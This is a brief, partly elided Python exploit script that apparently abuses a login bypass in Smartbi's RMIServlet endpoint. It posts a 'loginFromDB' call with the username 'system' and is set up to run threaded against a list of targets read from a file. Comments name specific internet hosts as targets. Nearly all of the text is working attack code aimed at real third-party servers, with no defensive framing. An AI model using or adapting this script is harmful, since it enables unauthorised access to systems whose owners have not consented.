...
def exploit(ip_, index):
    try:
        ...
        url = ip_+'/vision/RMIServlet'
        burp0_data = {"className": "UserService", "methodName": "loginFromDB", "params": "[\"system\",\"0a\"]"}
        res = requests.post(url, headers=headers,data=burp0_data, timeout=8, verify=False)
        if res.status_code!=200 or len(res.text)>300:
            return
...
threads = []
with open(r'D:\Downloads\tmp\smartbi.txt', 'r') as file:
...
# http://139.9.57.138/vision/index.jsp
# http://ysguanjia.cn/vision/index.jsp   一回事
